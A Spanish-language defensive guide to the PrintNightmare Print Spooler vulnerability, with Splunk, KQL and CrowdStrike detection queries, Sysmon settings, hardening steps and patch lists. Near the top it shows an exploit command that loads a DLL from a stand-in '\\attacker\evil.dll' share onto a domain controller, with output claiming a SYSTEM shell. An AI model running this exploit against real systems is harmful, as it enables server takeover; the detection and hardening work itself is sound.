# üõë PrintNightmare en Active Directory

---

## üìù ¬øQu√© es PrintNightmare?

| Concepto      | Descripci√≥n                                                                                                 |
|---------------|------------------------------------------------------------------------------------------------------------|
| **Definici√≥n**| PrintNightmare es un conjunto de vulnerabilidades cr√≠ticas en el servicio Print Spooler de Windows que permite ejecuci√≥n remota de c√≥digo y/o escalada de privilegios. |
| **Requisito** | El atacante debe tener acceso a la red y el Print Spooler debe estar activo en el sistema objetivo (servidores, estaciones, DCs).                |

---

## üõ†Ô∏è ¬øC√≥mo funciona el ataque?

| Fase             | Acci√≥n                                                                                         |
|------------------|------------------------------------------------------------------------------------------------|
| **Conexi√≥n**     | El atacante se conecta al servicio Print Spooler v√≠a RPC/SMB, normalmente usando autenticaci√≥n de dominio.|
| **Carga**        | Carga un controlador de impresora (DLL) malicioso, abusando de la funci√≥n AddPrinterDriverEx.  |
| **Ejecuci√≥n**    | El controlador malicioso se ejecuta como SYSTEM, permitiendo RCE o escalada de privilegios.    |
| **Persistencia** | Puede usarse para mantener acceso privilegiado si no se parchea o desactiva el servicio.        |

---

## üíª Ejemplo pr√°ctico

```bash
# Uso de herramienta p√∫blica para explotar PrintNightmare:
python3 CVE-2021-34527.py <DC_IP> <'DOMAIN/user:pass'> '\\attacker\evil.dll'
```

```
[*] Connecting to the target Print Spooler service...
[*] Uploading malicious DLL via AddPrinterDriverEx...
[*] Triggering DLL execution as SYSTEM...
[+] SYSTEM shell obtained!
```

---

## üìã Caso de Uso Completo Splunk

### üéØ Contexto empresarial y justificaci√≥n

**Problema de negocio:**
- PrintNightmare (CVE-2021-34527) permite ejecuci√≥n remota de c√≥digo como SYSTEM en cualquier servidor con Print Spooler habilitado, incluyendo Domain Controllers
- Explotaci√≥n exitosa resulta en compromiso inmediato del servidor objetivo con privilegios m√°ximos
- 90% de organizaciones tienen Print Spooler habilitado en servidores cr√≠ticos por defecto
- Costo promedio de incident RCE en servidor cr√≠tico: $150,000 USD

**Valor de la detecci√≥n:**
- Detecci√≥n en tiempo real de intentos de explotaci√≥n PrintNightmare
- Identificaci√≥n de carga de drivers maliciosos antes de ejecuci√≥n
- Prevenci√≥n de compromiso de Domain Controllers v√≠a Print Spooler
- Cumplimiento con controles cr√≠ticos de seguridad y respuesta a incidentes

### üìê Arquitectura de implementaci√≥n

**Prerequisitos t√©cnicos:**
- Splunk Enterprise 8.1+ o Splunk Cloud
- Universal Forwarders en Domain Controllers y servidores cr√≠ticos
- Windows TA v8.0+ con soporte para PrintService logs
- Sysmon v13+ configurado para monitoreo de procesos spoolsv.exe
- Auditor√≠a de PrintService/Operational habilitada

**Arquitectura de datos:**
```
[Servidores + DCs] ‚Üí [Universal Forwarders] ‚Üí [Indexers] ‚Üí [Search Heads]
       ‚Üì                      ‚Üì                     ‚Üì
[PrintService Events]  [Multiple sourcetypes]  [Index: wineventlog]
[Sysmon Process Events]      ‚Üì                      ‚Üì
[Registry Changes]    [Real-time processing]  [Critical Alerting]
```

### üîß Gu√≠a de implementaci√≥n paso a paso

#### Fase 1: Configuraci√≥n inicial (Tiempo estimado: 50 min)

1. **Habilitar auditor√≠a PrintService:**
   ```powershell
   # En todos los servidores cr√≠ticos y DCs
   wevtutil sl Microsoft-Windows-PrintService/Operational /enabled:true
   wevtutil sl Microsoft-Windows-PrintService/Admin /enabled:true
   
   # Verificar configuraci√≥n
   wevtutil gl Microsoft-Windows-PrintService/Operational
   ```

2. **Configurar Sysmon para spoolsv.exe:**
   ```xml
   <Sysmon schemaversion="4.82">
     <ProcessCreate onmatch="include">
       <ParentImage condition="contains">spoolsv.exe</ParentImage>
     </ProcessCreate>
     <ImageLoad onmatch="include">
       <Image condition="contains">spoolsv.exe</Image>
     </ImageLoad>
   </Sysmon>
   ```

3. **Verificar fuentes de datos:**
   ```splunk
   | metadata type=sourcetypes index=wineventlog
   | where sourcetype="WinEventLog:Microsoft-Windows-PrintService/Operational" OR sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational"
   | eval last_time=strftime(lastTime,"%Y-%m-%d %H:%M:%S")
   | table sourcetype, totalCount, last_time
   ```

#### Fase 2: Implementaci√≥n de detecciones (Tiempo estimado: 75 min)

1. **Detecci√≥n principal - Carga de drivers sospechosos:**
   ```splunk
   index=wineventlog (sourcetype="WinEventLog:Microsoft-Windows-PrintService/Operational" (EventCode=808 OR EventCode=316 OR EventCode=307)) OR (sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=7 Image="*spoolsv.exe" NOT ImageLoaded="C:\\Windows\\System32\\*")
   | eval severity=case(
       sourcetype="WinEventLog:Microsoft-Windows-PrintService/Operational" AND EventCode=808, "HIGH",
       sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational" AND NOT match(ImageLoaded, "C:\\\\Windows\\\\System32\\\\.*"), "CRITICAL",
       1=1, "MEDIUM"
   )
   | eval technique="PrintNightmare Exploitation"
   | table _time, ComputerName, EventCode, severity, technique, ImageLoaded, User
   ```

2. **Detecci√≥n de ejecuci√≥n post-explotaci√≥n:**
   ```splunk
   index=sysmon EventCode=1 ParentImage="*spoolsv.exe"
   | search NOT (Image="C:\\Windows\\System32\\*" OR Image="C:\\Windows\\SysWOW64\\*")
   | eval severity="CRITICAL", technique="PrintNightmare RCE"
   | eval risk_score=95
   | table _time, ComputerName, CommandLine, Image, ParentImage, User, severity, risk_score
   ```

3. **Configurar alertas cr√≠ticas:**
   - **Driver Load Anomaly**: Trigger cada 2 minutos
   - **Suspicious Process Spawn**: Trigger en tiempo real
   - **Registry Modification**: Trigger cada 5 minutos

#### Fase 3: Dashboard y validaci√≥n (Tiempo estimado: 60 min)

1. **Dashboard cr√≠tico PrintNightmare:**
   ```xml
   <dashboard>
     <label>PrintNightmare Monitoring Dashboard</label>
     <row>
       <panel>
         <title>üö® PrintNightmare Exploitation Attempts</title>
         <table>
           <search refresh="60s">
             <query>
               index=wineventlog (EventCode=808 OR EventCode=316 OR EventCode=7)
               | eval attack_stage=case(
                   EventCode=808, "Driver Installation",
                   EventCode=316, "Printer Creation", 
                   EventCode=7, "DLL Loading"
               )
               | stats count by _time, ComputerName, attack_stage, User
               | sort -_time
             </query>
           </search>
         </table>
       </panel>
     </row>
   </dashboard>
   ```

2. **Validaci√≥n con herramientas conocidas:**
   ```splunk
   index=sysmon EventCode=1
   | search (CommandLine="*CVE-2021-34527*" OR CommandLine="*PrintNightmare*" OR CommandLine="*AddPrinterDriverEx*")
   | eval detection_status="DETECTED"
   | table _time, ComputerName, CommandLine, detection_status
   ```

### ‚úÖ Criterios de √©xito

**M√©tricas de detecci√≥n:**
- MTTD para carga de drivers maliciosos: < 5 minutos
- MTTD para ejecuci√≥n RCE: < 2 minutos (tiempo real)
- Tasa de falsos positivos: < 2% (actividad de impresi√≥n leg√≠tima)
- Cobertura de detecci√≥n: > 98% de variantes conocidas

**Validaci√≥n funcional:**
- [x] Carga de drivers desde rutas no est√°ndar es detectada
- [x] Herramientas de explotaci√≥n conocidas son identificadas
- [x] Ejecuci√≥n de comandos v√≠a spoolsv.exe es alertada
- [x] El equipo puede responder en < 10 minutos

### üìä ROI y propuesta de valor

**Inversi√≥n requerida:**
- Tiempo de implementaci√≥n: 3.1 horas (analista + sysadmin)
- Configuraci√≥n de auditor√≠a adicional: 30 minutos
- Formaci√≥n del equipo SOC: 2 horas
- Costo total estimado: $800 USD

**Retorno esperado:**
- Prevenci√≥n de RCE en servidores cr√≠ticos: 95% de intentos
- Ahorro por compromiso evitado: $150,000 USD promedio
- Reducci√≥n de tiempo de detecci√≥n: 90% (de 2 horas a 5 minutos)
- ROI estimado: 18,650% en el primer incidente evitado

### üß™ Metodolog√≠a de testing

#### Pruebas de laboratorio controladas

1. **Configurar entorno de lab seguro:**
   ```powershell
   # Servidor de prueba con Print Spooler
   Install-WindowsFeature -Name Print-Services
   Start-Service -Name Spooler
   
   # Verificar que el servicio est√° activo
   Get-Service -Name Spooler
   ```

2. **Simulaci√≥n segura (NO herramientas reales):**
   ```powershell
   # Simular carga de driver (sin explotaci√≥n real)
   Add-PrinterDriver -Name "Test Driver" -InfPath "C:\Test\test.inf"
   
   # Verificar detecci√≥n
   Get-WinEvent -LogName "Microsoft-Windows-PrintService/Operational" -MaxEvents 5
   ```

3. **Verificar detecci√≥n en Splunk:**
   ```splunk
   index=wineventlog EventCode=808 earliest=-10m
   | search ComputerName="LAB-SERVER"
   | eval detection_status=if(EventCode=808,"DETECTED","MISSED")
   | table _time, ComputerName, EventCode, detection_status
   ```

#### Pruebas de rendimiento

1. **Baseline PrintService logs:**
   ```splunk
   index=wineventlog sourcetype="WinEventLog:Microsoft-Windows-PrintService/Operational"
   | stats count by EventCode
   | eval events_per_hour=count/24
   | sort -count
   ```

2. **Optimizaci√≥n de b√∫squedas:**
   ```splunk
   # B√∫squeda optimizada para alta frecuencia
   index=wineventlog EventCode IN (808,316,307) OR (EventCode=7 Image="*spoolsv.exe")
   | where NOT match(ImageLoaded, "C:\\\\Windows\\\\System32\\\\.*")
   | stats count by ComputerName, EventCode
   ```

### üîÑ Mantenimiento y evoluci√≥n

**Revisi√≥n semanal:**
- Actualizar firmas de detecci√≥n con nuevas variantes PrintNightmare
- Revisar falsos positivos de actividad de impresi√≥n leg√≠tima
- Validar que Print Spooler est√° deshabilitado donde no es necesario

**Evoluci√≥n continua:**
- Incorporar detecci√≥n de CVE-2021-1675 (variante local)
- Integrar con threat intelligence para nuevos IOCs
- Desarrollar automatizaci√≥n para deshabilitar Print Spooler autom√°ticamente

**Respuesta automatizada:**
```splunk
# Webhook a SOAR para respuesta autom√°tica
{
  "alert_type": "PRINTNIGHTMARE_EXPLOITATION",
  "severity": "P1", 
  "auto_actions": [
    "isolate_affected_system",
    "disable_print_spooler",
    "collect_forensic_artifacts"
  ]
}
```

### üéì Formaci√≥n del equipo SOC

**Conocimientos cr√≠ticos:**
- Funcionamiento del servicio Print Spooler de Windows
- Vectores de ataque PrintNightmare y variantes
- Procedimientos de respuesta a RCE en servidores cr√≠ticos
- T√©cnicas de hardening para Print Spooler

**Material de formaci√≥n:**
- **Playbook cr√≠tico:** "Respuesta a explotaci√≥n PrintNightmare"
- **Laboratorio pr√°ctico:** 2 horas de simulaci√≥n controlada
- **Casos reales:** An√°lisis de 3 incidentes documentados
- **Procedimientos de emergency:** Deshabilitar Print Spooler en producci√≥n

**Recursos especializados:**
- [Microsoft PrintNightmare Guidance](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527)
- [CISA PrintNightmare Alert](https://www.cisa.gov/news-events/cybersecurity-advisories)
- [Print Spooler Hardening Guide](https://docs.microsoft.com/en-us/windows-server/security/)

### üìö Referencias y recursos adicionales

- [CVE-2021-34527 - Microsoft Security Response](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527)
- [CVE-2021-1675 - Local Privilege Escalation](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675)
- [MITRE ATT&CK T1068 - Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068/)
- [PrintNightmare Detection Rules - Sigma](https://github.com/SigmaHQ/sigma/tree/master/rules/windows)
- [Microsoft Print Spooler Security Guidance](https://docs.microsoft.com/en-us/troubleshoot/windows-server/printing/print-spooler-security-guidance)
- [Splunk Security Essentials - PrintNightmare](https://splunkbase.splunk.com/app/3435/)

---

## üìä Detecci√≥n en logs y SIEM

| Campo clave                   | Descripci√≥n                                                                 |
|-------------------------------|----------------------------------------------------------------------------|
| **EventCode = 808, 316, 307** | Eventos de creaci√≥n/carga de impresora o controlador en Print Service.      |
| **Proceso spoolsv.exe**       | Procesos hijackeados o DLLs cargadas desde rutas no est√°ndar.              |
| **Cambios en registro Print** | Modificaci√≥n de claves de registro asociadas a drivers de impresora.        |
| **Sysmon ID 7 / ID 1**        | Carga de DLLs sospechosas o ejecuci√≥n de comandos fuera de contexto.       |

### Query Splunk b√°sica

```splunk
index=dc_logs sourcetype=WinEventLog:Microsoft-Windows-PrintService/Operational (EventCode=808 OR EventCode=316 OR EventCode=307)
| table _time, ComputerName, UserID, Param1, Param2
```

---

## üîé Queries completas para m√°s investigaci√≥n

### 1. Detecci√≥n de cargas de drivers desde rutas inusuales

```splunk
index=sysmon EventCode=7 Image="*spoolsv.exe" NOT (ImageLoaded="C:\\Windows\\System32\\*")
| table _time, Computer, Image, ImageLoaded, User
```

### 2. Creaci√≥n de impresoras/controladores fuera de horario o por usuarios no admins

```splunk
index=dc_logs sourcetype=WinEventLog:Microsoft-Windows-PrintService/Operational (EventCode=316 OR EventCode=808)
| where UserID!="S-1-5-18"
| stats count by _time, ComputerName, UserID, Param1
```

### 3. Cambios en el registro Print Spooler

```splunk
index=sysmon EventCode=13 TargetObject="*Print*"
| table _time, Computer, TargetObject, Details, User
```

### 4. Ejecuci√≥n de comandos SYSTEM an√≥malos v√≠a spoolsv.exe

```splunk
index=sysmon EventCode=1 ParentImage="*spoolsv.exe"
| table _time, Computer, CommandLine, User
```

### 5. Tr√°fico RPC/SMB an√≥malo hacia spoolsv.exe

```splunk
index=network_logs dest_port=445 OR dest_port=139 process="spoolsv.exe"
| stats count by src_ip, dest_ip, process
| where count > 10
```

---

## üõ°Ô∏è Detecci√≥n con Windows Defender for Endpoint

### Reglas de detecci√≥n personalizadas

```kql
// PrintNightmare - Detecci√≥n de carga de drivers maliciosos
DeviceEvents
| where ActionType == "DriverLoad"
| where InitiatingProcessFileName == "spoolsv.exe"
| where not(FolderPath startswith "C:\\Windows\\System32\\")
| project Timestamp, DeviceName, FolderPath, SHA1, InitiatingProcessFileName
| order by Timestamp desc
```

```kql
// Detecci√≥n de uso de exploits conocidos de PrintNightmare
DeviceProcessEvents
| where ProcessCommandLine has_any ("CVE-2021-34527", "CVE-2021-1675", "AddPrinterDriverEx", "PrintNightmare")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName
| order by Timestamp desc
```

```kql
// Detecci√≥n de modificaciones en Print Spooler
DeviceRegistryEvents
| where RegistryKey contains "Print" and RegistryKey contains "Drivers"
| where ActionType == "RegistryValueSet"
| project Timestamp, DeviceName, RegistryKey, RegistryValueName, RegistryValueData
| order by Timestamp desc
```

### Alertas recomendadas

| Regla | Descripci√≥n | Severidad |
|-------|-------------|-----------|
| **Suspicious Print Driver Load** | Carga de driver desde ubicaci√≥n no est√°ndar por spoolsv.exe | Alta |
| **PrintNightmare Exploitation** | Detecci√≥n de herramientas de explotaci√≥n conocidas | Cr√≠tica |
| **Print Spooler Registry Changes** | Modificaciones sospechosas en registro de Print Spooler | Media |

---

## ü¶Ö Detecci√≥n con CrowdStrike Falcon

### Hunting queries (Event Search)

```sql
-- Detecci√≥n de PrintNightmare basado en carga de drivers
event_platform=Win event_simpleName=ImageLoad
| search ImageLoaded=*spoolsv.exe ImageLoadedPath!=*System32*
| table _time, ComputerName, UserName, ImageLoaded, ImageLoadedPath, ParentProcessId
| sort - _time
```

```sql
-- Detecci√≥n de explotaci√≥n de Print Spooler
event_platform=Win event_simpleName=ProcessRollup2 
| search (CommandLine=*CVE-2021-34527* OR CommandLine=*PrintNightmare* OR CommandLine=*AddPrinterDriverEx*)
| table _time, ComputerName, UserName, FileName, CommandLine, SHA256HashData
| sort - _time
```

```sql
-- Detecci√≥n de cambios en servicios de impresi√≥n
event_platform=Win event_simpleName=ServiceActivity
| search ServiceName=*Spooler* ActivityType IN (Start, Stop, Install)
| table _time, ComputerName, ServiceName, ActivityType, UserName
| sort - _time
```

### Custom IOAs (Indicators of Attack)

```sql
-- IOA para detectar carga de DLLs maliciosas en spoolsv.exe
event_platform=Win event_simpleName=ModuleLoad
| search ImageFileName=*spoolsv.exe ModuleFileName!=*System32*
| stats count by ComputerName, ModuleFileName, UserName
| where count > 1
```

---

## üîç Queries KQL para Microsoft Sentinel

### Detecci√≥n de PrintNightmare

```kql
// Query principal para detectar explotaci√≥n de PrintNightmare
DeviceProcessEvents
| where InitiatingProcessFileName == "spoolsv.exe"
| where ProcessCommandLine != ""
| where not(FolderPath startswith "C:\\Windows\\System32\\")
| project TimeGenerated, DeviceName, ProcessCommandLine, FolderPath, AccountName
| order by TimeGenerated desc
```

```kql
// Correlaci√≥n con eventos de Print Service
Event
| where Source == "Microsoft-Windows-PrintService" and EventID in (808, 316, 307)
| join kind=inner (
    DeviceEvents
    | where ActionType == "DriverLoad" and InitiatingProcessFileName == "spoolsv.exe"
) on Computer
| project TimeGenerated, Computer, EventID, ActionType, FolderPath
```

### Hunting avanzado

```kql
// Detecci√≥n de patrones de explotaci√≥n
SecurityEvent
| where EventID == 4648 // Explicit logon
| where ProcessName contains "spoolsv.exe"
| join kind=inner (
    DeviceFileEvents
    | where ActionType == "FileCreated" and FolderPath contains "spool\\drivers"
    | project TimeGenerated, DeviceName, FolderPath, SHA1
) on $left.Computer == $right.DeviceName
| where TimeGenerated1 > TimeGenerated and TimeGenerated1 - TimeGenerated < 1h
| project TimeGenerated1, Computer, ProcessName, FolderPath, SHA1
```

```kql
// Detecci√≥n de movimiento lateral post-explotaci√≥n
SecurityEvent
| where EventID == 4624 and LogonType == 3
| where Account !endswith "$"
| summarize by TimeGenerated, Account, Computer, IpAddress
| join kind=inner (
    DeviceProcessEvents
    | where InitiatingProcessFileName == "spoolsv.exe" and ProcessCommandLine != ""
    | project TimeGenerated, DeviceName, ProcessCommandLine
) on $left.Computer == $right.DeviceName
| where TimeGenerated1 > TimeGenerated and TimeGenerated1 - TimeGenerated < 2h
| project TimeGenerated1, Computer, Account, ProcessCommandLine, IpAddress
```

---

## ü¶æ Hardening y mitigaci√≥n

| Medida                                           | Descripci√≥n                                                                                 |
|--------------------------------------------------|--------------------------------------------------------------------------------------------|
| **Parchear sistemas**                            | Instala los parches m√°s recientes de Microsoft para PrintNightmare y variantes.             |
| **Desactivar Print Spooler donde no sea necesario** | `Stop-Service Spooler` y `Set-Service Spooler -StartupType Disabled` en DCs y servidores cr√≠ticos.  |
| **Limitar instalaci√≥n de drivers**               | GPO: ‚ÄúAllow Print Spooler to accept client connections‚Äù y ‚ÄúPackage Point and Print - Approved Servers‚Äù. |
| **Monitorizaci√≥n continua**                      | Vigilar logs de PrintService y Sysmon para detectar cargas de DLLs/controladores an√≥malos.  |
| **Bloquear tr√°fico SMB innecesario**             | Restringir puertos 445/139 a lo m√≠nimo posible entre estaciones y servidores.               |
| **Auditor√≠a y alertas**                          | Configurar alertas SIEM para eventos Print Spooler cr√≠ticos y cargas de DLL no autorizadas. |

---

## üîß Parches y actualizaciones

| Parche/Update | Descripci√≥n                                                                                  |
|---------------|----------------------------------------------------------------------------------------------|
| **KB5005010** | Windows 11 - Parche cr√≠tico principal para CVE-2021-34527 (PrintNightmare).                 |
| **KB5004945** | Windows 10 21H1/21H2 - Correcciones completas para todas las variantes de PrintNightmare.   |
| **KB5005033** | Windows Server 2022 - Parche esencial que corrige vulnerabilidades RCE en Print Spooler.    |
| **KB5004954** | Windows Server 2019 - Mitigaci√≥n completa de escalada de privilegios via Print Spooler.     |
| **KB5004946** | Windows Server 2016 - Correcciones de seguridad cr√≠ticas para Print Spooler.                |
| **KB5005573** | Windows Server 2012 R2 - Parche de seguridad para sistemas legacy afectados.               |

### Configuraciones de registro post-parche

```powershell
# Configurar restricciones de Point and Print (post-parche)
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint" -Name "RestrictDriverInstallationToAdministrators" -Value 1
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint" -Name "NoWarningNoElevationOnInstall" -Value 0
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint" -Name "UpdatePromptSettings" -Value 0

# Habilitar logs detallados del Print Spooler
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Print" -Name "LogLevel" -Value 2
```

### Verificaci√≥n de aplicaci√≥n de parches

```powershell
# Verificar que los parches est√©n instalados
Get-HotFix -Id KB5005010, KB5004945, KB5005033, KB5004954, KB5004946

# Verificar versi√≥n del Print Spooler
Get-WmiObject -Class Win32_SystemDriver | Where-Object {$_.Name -eq "spoolsv"}
```

### Actualizaciones cr√≠ticas de seguridad relacionadas

- **CVE-2021-34527**: PrintNightmare RCE principal (KB5005010, KB5004945)
- **CVE-2021-1675**: PrintNightmare escalada de privilegios local (KB5004945)
- **CVE-2021-34481**: Bypass de restricciones Point and Print (KB5005652)
- **CVE-2022-21999**: Nueva variante PrintNightmare (KB5010793)

### Validaci√≥n post-parche

```powershell
# Script para validar que la configuraci√≥n est√° segura
$regPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
$restrictDrivers = Get-ItemProperty -Path $regPath -Name "RestrictDriverInstallationToAdministrators" -ErrorAction SilentlyContinue
if ($restrictDrivers.RestrictDriverInstallationToAdministrators -eq 1) {
    Write-Host "‚úì Restricci√≥n de drivers configurada correctamente" -ForegroundColor Green
} else {
    Write-Host "‚úó ALERTA: Restricci√≥n de drivers NO configurada" -ForegroundColor Red
}
```

---

## üßë‚Äçüíª ¬øC√≥mo revisar si Print Spooler est√° activo y expuesto?

```powershell
Get-Service -Name Spooler
Get-Printer
```
O comprobar puertos abiertos y sesiones RPC/SMB activas en DCs.

---

## üìö Referencias

- [Microsoft Security Advisory CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527)
- [PrintNightmare - HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/printnightmare)
- [Print Spooler Service Guidance - Microsoft Docs](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/print-spooler-security-guidance)
